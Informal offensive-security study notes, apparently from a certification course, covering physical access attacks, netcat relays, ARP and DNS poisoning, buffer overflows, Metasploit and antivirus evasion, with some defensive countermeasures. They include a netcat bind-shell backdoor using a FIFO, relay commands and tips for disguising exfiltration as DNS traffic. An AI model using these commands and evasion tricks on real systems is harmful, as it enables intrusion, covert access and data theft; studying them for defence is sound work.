#------------#
#   xploitz  #
#------------#

>PHYS.ATTKS
>>>>>>>NETCAT
>>>>>>>>>RELAYS
>>>>>>>>SNIFFING
>>>>>>>ARP POISON
>>>>>>>>>DNS SPOOF
>>>>>>>>>>>SSLCERTS
>>>>>>>>>>>>>>>>>>BOF
>>>>>>>>>>>>METASPLOIT
>>>>>>>>>>>>>METERPRETER
>>>>>>>>>>>>>>>>>>>>>>DEP
>>>>>>>>>>>>>>>>>CANAERIES
>>>>>>>>>>>>>>>>>>>>>>>VEIL
>>>>>>>>>>>>>>>>>>>>>UNICORN
>>>>>>>>>>>>>>>>>GHOSTWRITING

#-----PhysicalAttacks-----#


Konboot: usbBoot attack > any pwd accepted
>>>piotrbania[.]com/all/kon-boot

Inception: unlock powered/locked pc via DMA firewire/thunderbolt juice
>>>github/carmaa/inception

LAN turtle: usb ether adapter creates DNS noise + Responder gets hashes
Lanturtle[.]com

RUBBER DUCKY -- Human interface device (HID) for kboard cmds via DUCKY script

Use Full disk encryption - blocks Inception-style attacks
Restrict W+X USB ports. Only R access (not full RWX)
Pwd protect BIOS + disable USB boot
Disable LLMNR (local lan Manager)

#-----NETCAT-----#

R+W data ax net
→ can evade AV
-data transfer (move files)
-port+vuln scan
-juice open ports
-bd
-relay
<><>

-l: This option tells the Netcat to be in listen mode
-u: This shifts Netcat from TCP(default) to UDP mode
-p: For the listener, this is the listened port. For the client, this is source port.
-e: This is a very useful option. This tells what operation to perform after a successful connection.
-L: This makes a persistent listener. Work for Windows only
-wN: This option defines the timeout value. For example, w indicates to wait for 5 seconds before timeout.
-v: This is the verbose mode.




Nmap created a clone called Ncat
--->SSL encryption (both client/listener)
-----multiple clients:listener



[[[Client Mode]]]
NetCat allows only one client:listener
--default in client mode

***what is fragrouter***

[[[Listen Mode]]]
-waits for connections via port ( nc -l )
-packets/traffic comes in via the screen (stdout=screen by default)
-

***PRO TIP: stealthy file transfer via UDP port 53 -- looks like regular DNS traffic***
++PRO TIP: jus run /bin/sh or cmd.exe == already logged in as user who ran NC -l ++


#----MOVE FILES/DATA AX NET-----#
--the file tht gets eating by the mouth is the one being moved
L>C:
nc -l -p 1111 <file.exe
nc 1.2.3.4 1111 >file.exe

C>L:
nc 1.2.3.4 1111 <file.exe
nc -l -p 1111 >file.exe

#------RELAYS------#

1way juice street:

Everything coming here | Now goes here

Nc -l -p 1234 | nc dumbserver -p 4321

***TIP: Netway only performs one cmd after -e, so put everything in .bat file to exe more***
----put heavy cmds in batch file
-----run one nc cmd tht executes the batch file which does more ++

Create Relay via Win:
Create a .bat file containing a cmd to start nc client (nc 10.2.3.90 53)
Create relay (nc -l -p 1234 -e test.bat)

Create Relay via Unix:
Mknod backpipe p (creates FIFO filetype to carry data b/forth)
Nc -l -p 1234 0<backpipe | nc next_hop 4321 1>backpipe

Tip: Mknod backpipe p (old unix sys)
------Mkfifo backpipe (new unix sys)


hxxps://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/062115_2318_NetcatUses1.png


Netcat bd w/o -e 

/bin/bash 0<backpipe | nc -l -p 8080 1>backpipe


[PICERL]: know ways running on ur sys + close unused ports + patch + DinDepth

Useful for *Gcat + Meterpreter*

*lab*

B3.Pg23


#----SNIFFING----#

Goal: snatch packets from the LAN 

Broadcast network ---> everyone
Switch network → destination only

Promiscuous mode - all traff from/going anywhere on eth0
Each NIC has uniq MAC addr (48 bits)
-switches maps MAC/port to NIC
Aka CAM table (content addr memory)

Wireshark/tshark ++ protocol parsing >500

****TIP: all sniffers grab bits from the netways***

IP to MAC addr mapping = ARP (addr resolution protocol)
--->no way to tell if it’s from the tgt machine

!!!concern: anyone can send an ARP request (here, take this data...jus in case u wana know, the MAC for the IP 1.2.3.4 is AA:BB:CC:DD)!!!!

---> you can flood a switches memory/CAM table + poison tgt machine ARP cache
------even wen there’s current IP mappings already in the cache

Solaris has ARP TTL’s (wait for TTL is OVERRRRR and poison ARP cache!!!!!!!!!!!)

-resolve IP to Domain name = DNS
--->if empty, Win queries local sys:
-LLMNR (link local multicast name resolution)
-NBT-NS (netbios name service)

T00lz:
-bettercap finds tgts + arp poisons + traff hijacker
-arpspoof for arp poison + relay via attkr sys > tru dest
-MITMf by github/byt3bl33d3r/MITMf
-network miner (netresec[.]com/?page=Networkminer

ARP poison:
1> setup IP fwd all to router= redirect all attkr traffic to router (default gateway)
2> arp hit tgt system = maps IP of router to MAC of attkr
3> sniff network (tgt sends data > DG > attkr > DG


Playing with TCP stream
--fake update notifications, run .hta app (HTA drive by)
--MITMf bd exe files in transit (FilePwn)

DNS poison:
1> attkr uses dns poison (betttercap/mitmf)
2> tgt searches site via browser
3> attkr intercepts, sends fake dns request to wherever

#--SSL certificates----#

Goal: dodge em
1> compromise CA/RA - cert authority/registration auth
2> powerbleed/heartbleed memory from ssl en apache servers
3> hash collisions

#---session hijack---#

combo  > spoof + sniff <

-other ways to TAP traffic other than ARP poisons

-web proxy autodisc (WPAD)

[PICERL]: 

-set ARP tables at sysboot - IP:MAC (no overwrites)
-port security locks down MAC:port
-dynamic ARP inspection + dhcp snoop
-encrypt sesh
-secure protocols (SSH v2 / vpn cryp)
-don’t telnet 

#--------BOF----------#

Buffer overflows

-stuff fat data into small vessel


-how programs run on a pc:
1> cpu gets orders from mem
2> cpu has instruction pointer to tell next location
3> cpu goes to next location in mem

-exceptions are for branches/jumps encounters

Causes of branches/jumps: if/then conditions + loops + subroutines + go-to statements


#---subroutines---#

1> main function starts
2> subroutine is called
3> pointer jumps to new area of memory
4> RP returns to main function from subr

LIFO
--push things on top
--pop things from top

RP(return pointer) contains address where execution was shook 
---->where we wana return to after function

why: program calls subroutines to increase space for variables on stack
---stack is like a notepad to rmr things / space for memory


Create a BOF:
1> find vuln to bof
---a) brute force
----b) shove patterns of a bunch of garbage
-----c) find IP containing ur pattern (!exploitable)
2> write bytecode:mem
3> set RP to stack so it exez

[C lib Functions assoc to bof vulns]
-strcpy
-strncpy
-strcat
-sprintf
-scanf
-fgets
-gets
-getws
-memcpy
-memmove

-find the offset for RP !

-look for crashes -- if ABCD is in RP slot, that’s where to place the RP

NOP
-no operation assembly code = protocol for do nothing

NOP
NOP
NOP
NOP
Mal code 
RP

-NOP + mal code + RP = egg

#---METASPLOIT----#

-exploit framework
-stitches together custom xploits/payloads
-GUI = armitage
-can do vuln check first before wasting xploit
-cleans up after itself (doesnt leave sys/srvc crashes)

--Metasploit Interpreter == Meterpreter

Offers
1> no separate process = runs inside exploit
2> manipulates memory / no touch HDD
3> own cmd + no exe on tgt sys
4> new mods while running in memory
+encryption (TLS)

[P]ICERL: IPS/HIPS, app whitelisting


#----Windows-----#

Windows Defender has exploit guard (EG)

-mod: data exe prevention DEP (nonx stack)
DEP is hardware/software

-msf can dodge DEP via Return-Oriented programming (ROP)

-ROP makes RPs exe in legitimate Win DLLs 
-->attkrs can use ROP to exe RPs in libraries 1x1 to achieve #goals
---->#gadgets
-DEP can’t stop ROP since the libraries are legitimate OS functions

#---canaries---#

-canaries = integrity check for a RP
-sys calculates hash of RP (canary)
-funk call start, RP then canary
-funk call end, sys calculates hash (if yes, return to funk)
---if no, graceful crash

3 canaries:
-random (random values to protect RP)
-terminator (values dnt carry over)
-XOR (random values + xor’d stack data)


[PICERL]: identify server crashes + IV checks + nonx stacks + proxies + rebuild

#--protocol parsers---#

Can easily be BOFd as it opens files/searches

Veil/Unicorn (create macros in mal files)

Ghostwriting: junk code to bypass AV = add 2 subtract 2
---added code changes sig/hash of program
-edit assembly code
--search for xor register
--push [reg]
--pop [reg]
--xor [reg], [reg]
---->add/rm reg

-NOP enough to bypass most AV 

#---bypass security controls----#
-code cave = hijack jump funk > unused space in exe where malware waits
-keyed payloads = encrypted payload using key from envrmnt var
-digitally sign malware (stuxnet/flame/duqu)
-living off the land (LOL)
---> use native exe/tools cus AV cant detect (uses OS funk)



